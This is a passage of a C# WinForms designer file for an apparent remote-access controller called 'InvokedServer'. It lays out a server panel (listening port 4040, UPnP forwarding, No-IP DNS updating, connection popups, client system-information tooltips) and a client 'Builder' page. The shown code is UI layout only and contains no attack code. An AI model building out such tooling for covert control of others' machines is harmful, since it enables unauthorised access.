            this.guna2GroupBox1.Controls.Add(this.chkNoIPIntegration);
            this.guna2GroupBox1.Controls.Add(this.chkAutoListen);
            this.guna2GroupBox1.Controls.Add(this.guna2HtmlLabel4);
            this.guna2GroupBox1.Controls.Add(this.guna2HtmlLabel3);
            this.guna2GroupBox1.Controls.Add(this.chkShowTooltip);
            this.guna2GroupBox1.Controls.Add(this.chkUseUpnp);
            this.guna2GroupBox1.Controls.Add(this.guna2HtmlLabel5);
            this.guna2GroupBox1.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GroupBox1.CustomBorderThickness = new System.Windows.Forms.Padding(0, 25, 0, 0);
            this.guna2GroupBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GroupBox1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GroupBox1.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.guna2GroupBox1.Location = new System.Drawing.Point(7, 8);
            this.guna2GroupBox1.Name = "guna2GroupBox1";
            this.guna2GroupBox1.Size = new System.Drawing.Size(300, 381);
            this.guna2GroupBox1.TabIndex = 59;
            this.guna2GroupBox1.Text = "Server";
            this.guna2GroupBox1.TextOffset = new System.Drawing.Point(0, -7);
            this.guna2GroupBox1.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel8
            // 
            this.guna2HtmlLabel8.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel8.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel8.Location = new System.Drawing.Point(205, 308);
            this.guna2HtmlLabel8.Name = "guna2HtmlLabel8";
            this.guna2HtmlLabel8.Size = new System.Drawing.Size(78, 15);
            this.guna2HtmlLabel8.TabIndex = 59;
            this.guna2HtmlLabel8.Text = "Show password";
            // 
            // chkShowPassword
            // 
            this.chkShowPassword.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkShowPassword.CheckedState.BorderRadius = 2;
            this.chkShowPassword.CheckedState.BorderThickness = 1;
            this.chkShowPassword.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkShowPassword.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkShowPassword.Enabled = false;
            this.chkShowPassword.Location = new System.Drawing.Point(181, 307);
            this.chkShowPassword.Name = "chkShowPassword";
            this.chkShowPassword.Size = new System.Drawing.Size(18, 18);
            this.chkShowPassword.TabIndex = 58;
            this.chkShowPassword.Text = "chkShowPassword";
            this.chkShowPassword.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkShowPassword.UncheckedState.BorderRadius = 2;
            this.chkShowPassword.UncheckedState.BorderThickness = 1;
            this.chkShowPassword.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkShowPassword.Click += new System.EventHandler(this.chkShowPassword_Click);
            // 
            // chkPopup
            // 
            this.chkPopup.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkPopup.CheckedState.BorderRadius = 2;
            this.chkPopup.CheckedState.BorderThickness = 1;
            this.chkPopup.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkPopup.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkPopup.Location = new System.Drawing.Point(9, 156);
            this.chkPopup.Name = "chkPopup";
            this.chkPopup.Size = new System.Drawing.Size(18, 18);
            this.chkPopup.TabIndex = 56;
            this.chkPopup.Text = "chkAutoListen";
            this.chkPopup.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkPopup.UncheckedState.BorderRadius = 2;
            this.chkPopup.UncheckedState.BorderThickness = 1;
            this.chkPopup.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            // 
            // guna2HtmlLabel7
            // 
            this.guna2HtmlLabel7.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel7.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel7.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel7.Location = new System.Drawing.Point(33, 157);
            this.guna2HtmlLabel7.Name = "guna2HtmlLabel7";
            this.guna2HtmlLabel7.Size = new System.Drawing.Size(236, 15);
            this.guna2HtmlLabel7.TabIndex = 57;
            this.guna2HtmlLabel7.Text = "Show popup notification on new connection";
            // 
            // guna2GradientButton1
            // 
            this.guna2GradientButton1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2GradientButton1.Animated = true;
            this.guna2GradientButton1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.guna2GradientButton1.BorderRadius = 2;
            this.guna2GradientButton1.BorderThickness = 1;
            this.guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2GradientButton1.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton1.Image = global::InvokedServer.Properties.Resources.save;
            this.guna2GradientButton1.ImageSize = new System.Drawing.Size(16, 16);
            this.guna2GradientButton1.Location = new System.Drawing.Point(9, 352);
            this.guna2GradientButton1.Name = "guna2GradientButton1";
            this.guna2GradientButton1.Size = new System.Drawing.Size(281, 23);
            this.guna2GradientButton1.TabIndex = 55;
            this.guna2GradientButton1.Text = "Save";
            this.guna2GradientButton1.Click += new System.EventHandler(this.guna2GradientButton1_Click);
            // 
            // guna2HtmlLabel1
            // 
            this.guna2HtmlLabel1.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel1.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel1.Location = new System.Drawing.Point(9, 31);
            this.guna2HtmlLabel1.Name = "guna2HtmlLabel1";
            this.guna2HtmlLabel1.Size = new System.Drawing.Size(76, 15);
            this.guna2HtmlLabel1.TabIndex = 39;
            this.guna2HtmlLabel1.Text = "Port to listen on";
            // 
            // txtNoIPPass
            // 
            this.txtNoIPPass.Animated = true;
            this.txtNoIPPass.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtNoIPPass.BorderRadius = 2;
            this.txtNoIPPass.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtNoIPPass.DefaultText = "";
            this.txtNoIPPass.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtNoIPPass.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtNoIPPass.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtNoIPPass.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtNoIPPass.Enabled = false;
            this.txtNoIPPass.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtNoIPPass.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtNoIPPass.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtNoIPPass.ForeColor = System.Drawing.Color.White;
            this.txtNoIPPass.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtNoIPPass.Location = new System.Drawing.Point(149, 282);
            this.txtNoIPPass.Name = "txtNoIPPass";
            this.txtNoIPPass.PasswordChar = '•';
            this.txtNoIPPass.PlaceholderText = "[Pass]";
            this.txtNoIPPass.SelectedText = "";
            this.txtNoIPPass.Size = new System.Drawing.Size(141, 22);
            this.txtNoIPPass.TabIndex = 54;
            // 
            // btnListen
            // 
            this.btnListen.Animated = true;
            this.btnListen.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.btnListen.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.btnListen.BorderRadius = 2;
            this.btnListen.BorderThickness = 1;
            this.btnListen.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnListen.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnListen.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnListen.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnListen.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnListen.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.btnListen.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.btnListen.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.btnListen.ForeColor = System.Drawing.Color.White;
            this.btnListen.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnListen.ImageSize = new System.Drawing.Size(16, 16);
            this.btnListen.Location = new System.Drawing.Point(9, 77);
            this.btnListen.Name = "btnListen";
            this.btnListen.Size = new System.Drawing.Size(281, 23);
            this.btnListen.TabIndex = 31;
            this.btnListen.Text = "Start listening";
            this.btnListen.Click += new System.EventHandler(this.btnListen_Click);
            // 
            // txtNoIPUser
            // 
            this.txtNoIPUser.Animated = true;
            this.txtNoIPUser.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtNoIPUser.BorderRadius = 2;
            this.txtNoIPUser.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtNoIPUser.DefaultText = "";
            this.txtNoIPUser.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtNoIPUser.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtNoIPUser.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtNoIPUser.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtNoIPUser.Enabled = false;
            this.txtNoIPUser.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtNoIPUser.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtNoIPUser.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtNoIPUser.ForeColor = System.Drawing.Color.White;
            this.txtNoIPUser.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtNoIPUser.Location = new System.Drawing.Point(9, 282);
            this.txtNoIPUser.Name = "txtNoIPUser";
            this.txtNoIPUser.PlaceholderText = "[Mail]";
            this.txtNoIPUser.SelectedText = "";
            this.txtNoIPUser.Size = new System.Drawing.Size(134, 22);
            this.txtNoIPUser.TabIndex = 53;
            // 
            // ncPort
            // 
            this.ncPort.BackColor = System.Drawing.Color.Transparent;
            this.ncPort.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.ncPort.BorderRadius = 2;
            this.ncPort.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.ncPort.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.ncPort.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.ncPort.ForeColor = System.Drawing.SystemColors.Control;
            this.ncPort.Location = new System.Drawing.Point(9, 48);
            this.ncPort.Maximum = new decimal(new int[] {
            65535,
            0,
            0,
            0});
            this.ncPort.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.ncPort.Name = "ncPort";
            this.ncPort.Size = new System.Drawing.Size(281, 23);
            this.ncPort.TabIndex = 40;
            this.ncPort.UpDownButtonFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.ncPort.Value = new decimal(new int[] {
            4040,
            0,
            0,
            0});
            // 
            // txtNoIPHost
            // 
            this.txtNoIPHost.Animated = true;
            this.txtNoIPHost.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.txtNoIPHost.BorderRadius = 2;
            this.txtNoIPHost.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtNoIPHost.DefaultText = "";
            this.txtNoIPHost.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtNoIPHost.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtNoIPHost.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtNoIPHost.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtNoIPHost.Enabled = false;
            this.txtNoIPHost.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtNoIPHost.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtNoIPHost.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtNoIPHost.ForeColor = System.Drawing.Color.White;
            this.txtNoIPHost.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtNoIPHost.Location = new System.Drawing.Point(9, 254);
            this.txtNoIPHost.Name = "txtNoIPHost";
            this.txtNoIPHost.PlaceholderText = "[Host]";
            this.txtNoIPHost.SelectedText = "";
            this.txtNoIPHost.Size = new System.Drawing.Size(281, 22);
            this.txtNoIPHost.TabIndex = 52;
            // 
            // chkIPv6Support
            // 
            this.chkIPv6Support.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkIPv6Support.CheckedState.BorderRadius = 2;
            this.chkIPv6Support.CheckedState.BorderThickness = 1;
            this.chkIPv6Support.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkIPv6Support.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkIPv6Support.Location = new System.Drawing.Point(9, 108);
            this.chkIPv6Support.Name = "chkIPv6Support";
            this.chkIPv6Support.Size = new System.Drawing.Size(18, 18);
            this.chkIPv6Support.TabIndex = 42;
            this.chkIPv6Support.Text = "guna2CustomCheckBox1";
            this.chkIPv6Support.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkIPv6Support.UncheckedState.BorderRadius = 2;
            this.chkIPv6Support.UncheckedState.BorderThickness = 1;
            this.chkIPv6Support.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            // 
            // guna2HtmlLabel6
            // 
            this.guna2HtmlLabel6.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel6.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel6.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel6.Location = new System.Drawing.Point(33, 233);
            this.guna2HtmlLabel6.Name = "guna2HtmlLabel6";
            this.guna2HtmlLabel6.Size = new System.Drawing.Size(164, 15);
            this.guna2HtmlLabel6.TabIndex = 51;
            this.guna2HtmlLabel6.Text = "Enable No-Ip.com DNS Updater";
            // 
            // guna2HtmlLabel2
            // 
            this.guna2HtmlLabel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel2.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel2.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel2.Location = new System.Drawing.Point(33, 109);
            this.guna2HtmlLabel2.Name = "guna2HtmlLabel2";
            this.guna2HtmlLabel2.Size = new System.Drawing.Size(105, 15);
            this.guna2HtmlLabel2.TabIndex = 43;
            this.guna2HtmlLabel2.Text = "Enable IPv6 support";
            // 
            // chkNoIPIntegration
            // 
            this.chkNoIPIntegration.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkNoIPIntegration.CheckedState.BorderRadius = 2;
            this.chkNoIPIntegration.CheckedState.BorderThickness = 1;
            this.chkNoIPIntegration.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkNoIPIntegration.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkNoIPIntegration.Location = new System.Drawing.Point(9, 231);
            this.chkNoIPIntegration.Name = "chkNoIPIntegration";
            this.chkNoIPIntegration.Size = new System.Drawing.Size(18, 18);
            this.chkNoIPIntegration.TabIndex = 50;
            this.chkNoIPIntegration.Text = "guna2CustomCheckBox5";
            this.chkNoIPIntegration.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkNoIPIntegration.UncheckedState.BorderRadius = 2;
            this.chkNoIPIntegration.UncheckedState.BorderThickness = 1;
            this.chkNoIPIntegration.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkNoIPIntegration.Click += new System.EventHandler(this.chkNoIPIntegration_Click);
            // 
            // chkAutoListen
            // 
            this.chkAutoListen.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkAutoListen.CheckedState.BorderRadius = 2;
            this.chkAutoListen.CheckedState.BorderThickness = 1;
            this.chkAutoListen.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkAutoListen.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkAutoListen.Location = new System.Drawing.Point(9, 132);
            this.chkAutoListen.Name = "chkAutoListen";
            this.chkAutoListen.Size = new System.Drawing.Size(18, 18);
            this.chkAutoListen.TabIndex = 44;
            this.chkAutoListen.Text = "chkAutoListen";
            this.chkAutoListen.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkAutoListen.UncheckedState.BorderRadius = 2;
            this.chkAutoListen.UncheckedState.BorderThickness = 1;
            this.chkAutoListen.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            // 
            // guna2HtmlLabel4
            // 
            this.guna2HtmlLabel4.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel4.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel4.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel4.Location = new System.Drawing.Point(33, 205);
            this.guna2HtmlLabel4.Name = "guna2HtmlLabel4";
            this.guna2HtmlLabel4.Size = new System.Drawing.Size(245, 15);
            this.guna2HtmlLabel4.TabIndex = 49;
            this.guna2HtmlLabel4.Text = "Show tooltip on client with system information";
            // 
            // guna2HtmlLabel3
            // 
            this.guna2HtmlLabel3.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel3.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel3.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel3.Location = new System.Drawing.Point(33, 133);
            this.guna2HtmlLabel3.Name = "guna2HtmlLabel3";
            this.guna2HtmlLabel3.Size = new System.Drawing.Size(199, 15);
            this.guna2HtmlLabel3.TabIndex = 45;
            this.guna2HtmlLabel3.Text = "Listen for new connections on startup";
            // 
            // chkShowTooltip
            // 
            this.chkShowTooltip.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkShowTooltip.CheckedState.BorderRadius = 2;
            this.chkShowTooltip.CheckedState.BorderThickness = 1;
            this.chkShowTooltip.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkShowTooltip.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkShowTooltip.Location = new System.Drawing.Point(9, 204);
            this.chkShowTooltip.Name = "chkShowTooltip";
            this.chkShowTooltip.Size = new System.Drawing.Size(18, 18);
            this.chkShowTooltip.TabIndex = 48;
            this.chkShowTooltip.Text = "guna2CustomCheckBox3";
            this.chkShowTooltip.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkShowTooltip.UncheckedState.BorderRadius = 2;
            this.chkShowTooltip.UncheckedState.BorderThickness = 1;
            this.chkShowTooltip.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            // 
            // chkUseUpnp
            // 
            this.chkUseUpnp.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkUseUpnp.CheckedState.BorderRadius = 2;
            this.chkUseUpnp.CheckedState.BorderThickness = 1;
            this.chkUseUpnp.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.chkUseUpnp.CheckMarkColor = System.Drawing.SystemColors.Control;
            this.chkUseUpnp.Location = new System.Drawing.Point(9, 180);
            this.chkUseUpnp.Name = "chkUseUpnp";
            this.chkUseUpnp.Size = new System.Drawing.Size(18, 18);
            this.chkUseUpnp.TabIndex = 46;
            this.chkUseUpnp.Text = "guna2CustomCheckBox4";
            this.chkUseUpnp.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.chkUseUpnp.UncheckedState.BorderRadius = 2;
            this.chkUseUpnp.UncheckedState.BorderThickness = 1;
            this.chkUseUpnp.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            // 
            // guna2HtmlLabel5
            // 
            this.guna2HtmlLabel5.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel5.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2HtmlLabel5.ForeColor = System.Drawing.SystemColors.Control;
            this.guna2HtmlLabel5.Location = new System.Drawing.Point(34, 181);
            this.guna2HtmlLabel5.Name = "guna2HtmlLabel5";
            this.guna2HtmlLabel5.Size = new System.Drawing.Size(227, 15);
            this.guna2HtmlLabel5.TabIndex = 47;
            this.guna2HtmlLabel5.Text = "Try to automatically forward the port (UPnP)";
            // 
            // BuilderPage
            // 
            this.BuilderPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.BuilderPage.Controls.Add(this.guna2GradientButton6);
            this.BuilderPage.Controls.Add(this.guna2GroupBox3);
            this.BuilderPage.Controls.Add(this.guna2GroupBox6);
            this.BuilderPage.Controls.Add(this.guna2GroupBox5);
            this.BuilderPage.Controls.Add(this.guna2GroupBox4);
            this.BuilderPage.Controls.Add(this.OpenBuilderBtn);
            this.BuilderPage.Flags = 65534;
            this.BuilderPage.ImageSmall = global::InvokedServer.Properties.Resources.bricks;
            this.BuilderPage.LastVisibleSet = true;
            this.BuilderPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.BuilderPage.Name = "BuilderPage";
            this.BuilderPage.Size = new System.Drawing.Size(879, 396);
            this.BuilderPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.BuilderPage.Text = "Builder";
            this.BuilderPage.ToolTipTitle = "Page ToolTip";
            this.BuilderPage.UniqueName = "6A83483458494AE65EA3BE931AE483D4";
            // 
            // guna2GradientButton6
            // 
            this.guna2GradientButton6.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2GradientButton6.Animated = true;
            this.guna2GradientButton6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton6.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.guna2GradientButton6.BorderRadius = 2;
            this.guna2GradientButton6.BorderThickness = 1;
            this.guna2GradientButton6.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton6.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton6.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton6.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton6.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GradientButton6.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton6.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2GradientButton6.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton6.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton6.Image = global::InvokedServer.Properties.Resources.save;
            this.guna2GradientButton6.ImageSize = new System.Drawing.Size(16, 16);
